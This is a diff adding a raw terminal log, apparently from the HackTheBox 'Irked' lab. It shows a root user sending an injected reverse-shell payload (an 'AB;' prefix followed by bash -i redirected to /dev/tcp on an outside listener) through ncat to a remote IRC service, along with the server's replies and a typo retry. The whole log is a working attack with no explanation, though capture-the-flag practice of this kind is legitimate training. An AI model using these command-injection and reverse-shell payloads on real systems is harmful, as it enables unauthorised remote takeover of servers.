@@ -1,0 +1,13 @@
+┌─[root@parrot]─[~/hackthebox/irked]      
+└──╼ #echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001'"| ncat 10.10.10.117 8067                                                                                   
+:irked.htb NOTICE AUTH :*** Looking up your hostname...                              
+:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead                                                                                 
+:irked.htb 451 AB; :You have not registered                                          
+ERROR :Closing Link: [10.10.14.14] (Client exited)                                   
+┌─[root@parrot]─[~/hackthebox/irked]      
+└──╼ #echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'"| ncat 10.10.10.117 80671                                                                             
+Ncat: Invalid port number "80671". QUITTING.                                         
+┌─[✗]─[root@parrot]─[~/hackthebox/irked]  
+└──╼ #echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'"| ncat 10.10.10.117 8067                                                                              
+:irked.htb NOTICE AUTH :*** Looking up your hostname...                              
+:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead                                                                                 
